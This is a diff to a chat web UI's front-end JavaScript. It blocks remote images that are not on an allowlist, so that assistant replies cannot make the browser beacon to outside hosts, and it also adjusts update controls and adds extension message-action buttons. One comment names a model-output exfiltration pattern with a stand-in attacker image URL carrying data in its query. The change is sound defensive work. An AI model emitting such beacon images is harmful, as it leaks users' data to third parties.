@@ -2833,6 +2833,85 @@ function _dataImageHtml(ref, altText){
   return `<img class="msg-media-img" src="${esc(ref)}" alt="${esc(altText||'image')}" loading="lazy">`;
 }
 
+// Remote image policy (#7941). The served CSP img-src is default-deny for
+// remote origins: an assistant reply containing ![x](https://attacker/?d=...)
+// must not make the browser beacon to that host on render. Operators opt
+// specific origins back in with HERMES_WEBUI_CSP_IMG_EXTRA; the server hands
+// the validated list to the page as window.__HERMES_CONFIG__.imgSrcExtra. The
+// renderer mirrors that list so a non-allowlisted remote image becomes an inert
+// "Open image" link (nothing is fetched until the user clicks) instead of a
+// broken <img> the browser refuses to load. The CSP header stays the security
+// boundary: a mismatch here only changes which fallback is shown.
+function _remoteImageSources(){
+  const cfg=(typeof window!=='undefined'&&window.__HERMES_CONFIG__)||{};
+  return Array.isArray(cfg.imgSrcExtra)?cfg.imgSrcExtra.map(String):[];
+}
+
+function _remoteImageSourceMatches(source, url){
+  const s=String(source||'').trim().toLowerCase();
+  if(s==='https:') return url.protocol==='https:';
+  if(s==='http:') return url.protocol==='http:'||url.protocol==='https:';
+  const m=s.match(/^(https?):\/\/(\*\.)?([a-z0-9._~-]+)(?::(\d{1,5}|\*))?$/);
+  if(!m) return false;
+  const scheme=m[1]+':';
+  if(!(url.protocol===scheme||(scheme==='http:'&&url.protocol==='https:'))) return false;
+  const host=url.hostname.toLowerCase();
+  if(m[2]){
+    if(!(host.length>m[3].length+1&&host.endsWith('.'+m[3]))) return false;
+  }else if(host!==m[3]){
+    return false;
+  }
+  if(m[4]==='*') return true;
+  const defaultPort=url.protocol==='https:'?'443':'80';
+  const urlPort=url.port||defaultPort;
+  const sourcePort=m[4]||(scheme==='https:'?'443':'80');
+  if(!m[4]&&scheme==='http:'&&url.protocol==='https:') return urlPort==='443';
+  return urlPort===sourcePort;
+}
+
+// True when an image URL may load inline: relative (same origin by
+// definition), same origin as the page, a non-http(s) scheme (data:/blob: and
+// friends are judged by the existing sanitizers), or matched by an
+// operator-allowlisted img-src source. Scheme-relative `//host/x` and
+// backslash forms the browser normalises (`https:\\host`) are treated as
+// absolute so they cannot slip past as "relative".
+function _remoteImageAllowed(raw){
+  // Normalise the way the URL parser does before classifying: strip leading/
+  // trailing C0-control-or-space and remove every tab/LF/CR, so `\x01https://x`
+  // or `ht\ttps://x` cannot pass as "relative" while the browser loads it.
+  const value=String(raw||'').replace(/^[\u0000-\u0020]+|[\u0000-\u0020]+$/g,'').replace(/[\t\n\r]/g,'');
+  if(!value) return true;
+  const isAbsolute=/^[a-z][a-z0-9+.-]*:/i.test(value)||/^[\\/]{2}/.test(value);
+  if(!isAbsolute) return true;
+  const hasLocation=typeof location!=='undefined'&&location&&location.href;
+  let url;
+  try{url=new URL(value, hasLocation?location.href:'http://invalid.invalid/');}catch(_){return false;}
+  if(url.protocol!=='http:'&&url.protocol!=='https:') return true;
+  if(hasLocation&&url.origin===location.origin) return true;
+  return _remoteImageSources().some(source=>_remoteImageSourceMatches(source,url));
+}
+
+function _remoteImageReason(raw){
+  let host='';
+  try{host=new URL(String(raw||'')).host;}catch(_){host='';}
+  const reason=(typeof t==='function'?t('remote_image_reason'):'')||'Remote image not loaded automatically. Opens {host} in a new tab.';
+  return reason.replace('{host}', host||'the link');
+}
+
+function _remoteImagePlaceholderHtml(raw, altText){
+  let host='';
+  try{host=new URL(String(raw||'')).host;}catch(_){host='';}
+  const label=(typeof t==='function'?t('remote_image_open'):'')||'Open image';
+  // Say WHY the picture is not shown (title only: aria-label would replace the
+  // visible 'Open image' accessible name, WCAG 2.5.3), like the PDF/HTML
+  // preview fallbacks and mail clients do. Alt text is model-controlled, so it
+  // only ever goes in the title after the reason, never in the visible label.
+  const reason=_remoteImageReason(raw);
+  const alt=String(altText||'').trim();
+  const tip=alt&&alt!=='image'?`${reason} (${alt.slice(0,120)})`:reason;
+  return `<a class="msg-media-link" href="${esc(String(raw||''))}" target="_blank" rel="noopener" title="${esc(tip)}">🖼 ${esc(label)}${host?` · ${esc(host)}`:''}</a>`;
+}
+
 // Markdown image syntax ![alt](url) → HTML. https:// keeps the historical direct
 // <img>; file:// and bare data:image/ URIs route through the same helpers the
 // MEDIA: pipeline uses, so ![x](file:///p.png) renders the artifact card instead
@@ -2845,6 +2924,7 @@ function _mdImageHtml(alt, url){
     return esc(`![${alt}](${String(url).slice(0,64)}…)`);
   }
   if(/^file:\/\//i.test(url)) return _inlineMediaHtmlForRef(url,undefined,alt);
+  if(typeof _remoteImageAllowed==='function'&&!_remoteImageAllowed(url)) return _remoteImagePlaceholderHtml(url, alt);
   return `<img src="${url.replace(/"/g,'%22')}" alt="${esc(alt)}" class="msg-media-img" loading="lazy">`;
 }
 
@@ -2937,13 +3017,16 @@ function _inlineMediaHtmlForRef(ref, sessionId, altText){
       src=src.replace(/^https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?/i,base);
     }
     const urlPath=src.split('?')[0];
+    const mediaKind=_mediaKindForName(urlPath);
+    if(mediaKind==='audio'||mediaKind==='video') return _mediaPlayerHtml(mediaKind,src,urlPath.split('/').pop()||mediaKind);
+    // Remote image outside the CSP img-src allowlist (#7941): render an inert
+    // click-to-open link so the browser makes no request on render.
+    if(typeof _remoteImageAllowed==='function'&&!_remoteImageAllowed(src)) return _remoteImagePlaceholderHtml(src);
     // SVG URLs → render inline as image (must precede the https:// <img>
     // catch-all below so extensionless CDN SVG paths still match)
     if(_SVG_EXTS.test(urlPath)){
       return `<img class="msg-media-svg" src="${esc(src)}" alt="${esc(typeof t==='function'?t('media_svg_label'):'svg')}" loading="lazy">`;
     }
-    const mediaKind=_mediaKindForName(urlPath);
-    if(mediaKind==='audio'||mediaKind==='video') return _mediaPlayerHtml(mediaKind,src,urlPath.split('/').pop()||mediaKind);
     // Render all https:// URLs as <img> — extensionless CDN paths like fal.media still work (#853)
     if(_IMAGE_EXTS.test(urlPath) || /^https?:\/\//i.test(src)){
       return `<img class="msg-media-img" src="${esc(src)}" alt="image" loading="lazy">`;
@@ -8495,10 +8578,28 @@ function renderMd(raw){
       const rel=a.rel==='noopener'?' rel="noopener"':'';
       const cls=_cls(a.class,['msg-media-link','skill-linked-file','skill-file-back','session-link']);
       const download=a.download?` download="${esc(a.download)}"`:'';
-      return `<a${cls} href="${esc(_safeAttrValue(a.href))}"${target}${rel}${download}>`;
+      // #7941: keep the blocked-remote-image tooltip only on a media chip whose
+      // href really is a non-allowlisted remote image AND whose title begins with
+      // the reason computed from that same href, so model-authored anchors cannot
+      // carry arbitrary tooltips.
+      let tipAttr='';
+      if(a.title&&cls.includes('msg-media-link')&&typeof _remoteImageAllowed==='function'
+         &&typeof _remoteImageReason==='function'){
+        const href=_safeAttrValue(a.href);
+        const tip=_safeAttrValue(a.title);
+        const reason=/^https?:\/\//i.test(href)&&!_remoteImageAllowed(href)?_remoteImageReason(href):'';
+        // Exactly the shapes _remoteImagePlaceholderHtml emits: the reason, or the
+        // reason followed by " (<alt>)".
+        // The producer caps alt at 120 chars; re-admit no longer suffix than that.
+        if(reason&&(tip===reason||(tip.startsWith(reason+' (')&&tip.endsWith(')')&&tip.length<=reason.length+123))){
+          tipAttr=` title="${esc(tip)}"`;
+        }
+      }
+      return `<a${cls} href="${esc(_safeAttrValue(a.href))}"${target}${rel}${download}${tipAttr}>`;
     }
     if(name==='img'){
       if(!_isSafeUrl(a.src,true)) return '';
+      if(typeof _remoteImageAllowed==='function'&&!_remoteImageAllowed(_safeAttrValue(a.src))) return _remoteImagePlaceholderHtml(_safeAttrValue(a.src), _safeAttrValue(a.alt||''));
       const cls=_cls(a.class,['msg-media-img']);
       const alt=` alt="${esc(_safeAttrValue(a.alt||''))}"`;
       const loading=a.loading==='lazy'?' loading="lazy"':'';
@@ -10615,7 +10716,8 @@ function _formatUpdateTargetStatus(label,info){
 }
 function _formatManualUpdateInstruction(info){
   if(!(info&&info.no_git&&info.manual_update&&info.behind>0)) return null;
-  return t('settings_update_manual_docker','docker pull ghcr.io/nesquena/hermes-webui:latest');
+  const tag=info.channel==='experimental'?'experimental':'latest';
+  return t('settings_update_manual_docker',`docker pull ghcr.io/nesquena/hermes-webui:${tag}`);
 }
 function _formatUpdateCheckError(label,info){
   if(!info||!info.error) return null;
@@ -10933,9 +11035,9 @@ function _showUpdateBanner(data){
     btnApply.style.display=hasApplyTargets?'':'none';
     if(webuiManual){
       const forceBtn=$('btnForceUpdate');
-      if(forceBtn){forceBtn.disabled=true;forceBtn.style.display='none';forceBtn.dataset.target='';}
+      if(forceBtn&&!(agentUpdatable&&forceBtn.dataset.target==='agent')){forceBtn.disabled=true;forceBtn.style.display='none';forceBtn.dataset.target='';}
       const clearLockBtn=$('btnClearUpdateLock');
-      if(clearLockBtn){clearLockBtn.disabled=true;clearLockBtn.style.display='none';clearLockBtn.dataset.target='';}
+      if(clearLockBtn&&!(agentUpdatable&&clearLockBtn.dataset.target==='agent')){clearLockBtn.disabled=true;clearLockBtn.style.display='none';clearLockBtn.dataset.target='';}
     }
   }
   if(!parts.length){
@@ -11059,6 +11161,7 @@ function _showUpdateError(target,res){
   // modifications).
   if(forceBtn&&(res.conflict||res.diverged)){
     forceBtn.dataset.target=target;
+    forceBtn.disabled=false;
     forceBtn.style.display='inline-block';
   }
   // Show "Clear lock and retry update" when the only failure was a stale
@@ -11067,6 +11170,7 @@ function _showUpdateError(target,res){
   const clearLockBtn=$('btnClearUpdateLock');
   if(clearLockBtn&&res.lock_conflict){
     clearLockBtn.dataset.target=target;
+    clearLockBtn.disabled=false;
     clearLockBtn.style.display='inline-block';
   }
 }
@@ -16118,6 +16222,114 @@ function clearMessageRenderCache(){
   _clearMessageVirtualHeightCache();
 }
 
+function _extensionMessageActionContext(slot,includeText){
+  if(!slot||!S.session||!slot.closest) return null;
+  if(slot.closest('[hidden],[aria-hidden="true"],[data-live-assistant="1"]')) return null;
+  const owner=slot.closest('[data-msg-idx][data-session-msg-idx][data-raw-text]');
+  const roleOwner=slot.closest('[data-role]');
+  const role=roleOwner&&roleOwner.dataset?roleOwner.dataset.role:'';
+  if(!owner||(role!=='user'&&role!=='assistant')) return null;
+  const rawIdx=Number(owner.dataset.msgIdx);
+  const messageIndex=Number(owner.dataset.sessionMsgIdx);
+  if(!Number.isSafeInteger(rawIdx)||rawIdx<0||!Number.isSafeInteger(messageIndex)||messageIndex<0) return null;
+  if(_messageSessionIndexForRawIdx(rawIdx)!==messageIndex) return null;
+  const message=S.messages&&S.messages[rawIdx];
+  if(!message||message.role!==role) return null;
+  const context={sessionId:String(S.session.session_id||''),messageIndex,role};
+  if(!context.sessionId) return null;
+  if(includeText) context.text=String(owner.dataset.rawText||'');
+  return context;
+}
+
+function _extensionMessageActionButtonHtml(action,context){
+  const label=esc(String(action.label||''));
+  const pending=action.pending===true;
+  return `<button type="button" class="msg-action-btn extension-msg-action" data-extension-message-action="1" data-extension-id="${esc(String(action.extensionId||''))}" data-extension-action-id="${esc(String(action.id||''))}" data-session-id="${esc(context.sessionId)}" data-message-index="${context.messageIndex}" data-message-role="${context.role}" title="${label}" aria-label="${label}" aria-pressed="${action.pressed===true?'true':'false'}" aria-busy="${pending?'true':'false'}"${pending?' disabled':''} onclick="invokeExtensionMessageAction(this)">${li(action.icon,13)}</button>`;
+}
+
+function _syncExtensionMessageActionSlots(root){
+  const runtime=window.HermesExtensionSettings;
+  if(!runtime||typeof runtime._messageActionsForContext!=='function') return;
+  const scope=root&&typeof root.querySelectorAll==='function'?root:document;
+  // No extension has registered an action (the common case): skip per-row context
+  // resolution and only empty slots still holding buttons from a retired registration.
+  if(typeof runtime._hasMessageActions==='function'&&!runtime._hasMessageActions()){
+    for(const slot of scope.querySelectorAll('[data-extension-message-actions]:not(:empty)')) slot.innerHTML='';
+    return;
+  }
+  for(const slot of scope.querySelectorAll('[data-extension-message-actions]')){
+    const context=_extensionMessageActionContext(slot,false);
+    const actions=context?runtime._messageActionsForContext(context):[];
+    const existing=Array.from(slot.children||[]);
+    const sameActions=existing.length===actions.length&&existing.every((button,index)=>{
+      const action=actions[index];
+      return !!(
+        button&&button.dataset&&action&&
+        button.dataset.extensionId===action.extensionId&&
+        button.dataset.extensionActionId===action.id
+      );
+    });
+    if(sameActions){
+      existing.forEach((button,index)=>{
+        const action=actions[index];
+        const pending=action.pending===true;
+        button.dataset.sessionId=context.sessionId;
+        button.dataset.messageIndex=String(context.messageIndex);
+        button.dataset.messageRole=context.role;
+        button.setAttribute('aria-pressed',action.pressed===true?'true':'false');
+        button.setAttribute('aria-busy',pending?'true':'false');
+        button.disabled=pending;
+      });
+      continue;
+    }
+    const html=actions.map(action=>_extensionMessageActionButtonHtml(action,context)).join('');
+    if(slot.innerHTML!==html) slot.innerHTML=html;
+  }
+}
+
+function invokeExtensionMessageAction(button){
+  if(!button||button.disabled) return false;
+  const slot=button.closest&&button.closest('[data-extension-message-actions]');
+  const context=_extensionMessageActionContext(slot,true);
+  if(!context) return false;
+  if(
+    button.dataset.sessionId!==context.sessionId||
+    Number(button.dataset.messageIndex)!==context.messageIndex||
+    button.dataset.messageRole!==context.role
+  ) return false;
+  const runtime=window.HermesExtensionSettings;
+  if(!runtime||typeof runtime._invokeMessageAction!=='function') return false;
+  return runtime._invokeMessageAction(
+    button.dataset.extensionId,
+    button.dataset.extensionActionId,
+    context,
+    {
+      opener:button,
+      onError(){
+        if(typeof showToast==='function') showToast('Extension message action failed',4000,'error');
+      },
+    }
+  );
+}
+
+let _extensionMessageActionChangeUnsubscribe=null;
+window._bindHermesExtensionMessageActions=function(){
+  if(_extensionMessageActionChangeUnsubscribe) return;
+  const runtime=window.HermesExtensionSettings;
+  if(!runtime||typeof runtime._onMessageActionChange!=='function') return;
+  _extensionMessageActionChangeUnsubscribe=runtime._onMessageActionChange((change)=>{
+    // Only cached transcript HTML can hold stale action buttons. A pending flip is
+    // reconciled in place below (the opener stays connected), so it drops nothing;
+    // other changes drop just the per-session HTML, not the markdown/height caches.
+    if(!change||change.reason!=='pending'){
+      _sessionHtmlCache.clear();
+      _sessionHtmlCacheSid=null;
+    }
+    _syncExtensionMessageActionSlots(document.getElementById('msgInner'));
+  });
+  _syncExtensionMessageActionSlots(document.getElementById('msgInner'));
+};
+
 // #6999: feed a structured payload field's string form through the FNV-1a
 // loop IN FULL, without materializing clipped copies or skipping the middle.
 // The previous length+head+tail clip made same-length middle-only edits
@@ -17425,6 +17637,7 @@ function renderMessages(options){
       _sessionHtmlCacheSid=sid;
       _rehydrateTransparentStreamDom(inner);
       _rehydrateDeferredWorklogsFromCache(inner);
+      if(typeof _syncExtensionMessageActionSlots==='function') _syncExtensionMessageActionSlots(inner);
       _wireMessageWindowLoadEarlierButton();
       if(typeof _applySessionNavigationPrefs==='function') _applySessionNavigationPrefs();
       _scrollAfterMessageRender(preserveScroll, scrollSnapshot);
@@ -17935,7 +18148,8 @@ function renderMessages(options){
     const questionJumpBtn = (_qJumpTarget!==undefined&&_qJumpTarget!==null)
       ? _questionJumpButtonHtml(_qJumpTarget, assistantRawIdxByQuestionRawIdx.get(_qJumpTarget)??rawIdx)
       : '';
-    const footHtml = `<div class="msg-foot">${timeHtml}<span class="msg-actions">${editBtn}${ttsBtn}${forkBtn}${copyBtn}${retryBtn}</span>${questionJumpBtn}</div>`;
+    const extensionActionsSlot='<span class="extension-message-actions" data-extension-message-actions></span>';
+    const footHtml = `<div class="msg-foot">${timeHtml}<span class="msg-actions">${editBtn}${ttsBtn}${forkBtn}${copyBtn}${retryBtn}${extensionActionsSlot}</span>${questionJumpBtn}</div>`;
 
     if(_isContextCompactionMessage(m)){
       continue;
@@ -19091,6 +19305,7 @@ function renderMessages(options){
   }
   // Apply persisted playback speed after media nodes are rendered.
   if(typeof _applyMediaPlaybackPreferences==='function') _applyMediaPlaybackPreferences(inner);
+  if(typeof _syncExtensionMessageActionSlots==='function') _syncExtensionMessageActionSlots(inner);
   // Populate session cache so switching back here skips a full rebuild.
   _sessionHtmlCacheSid=sid;
   // Skip caching while the just-settled keep-open token is armed: that render
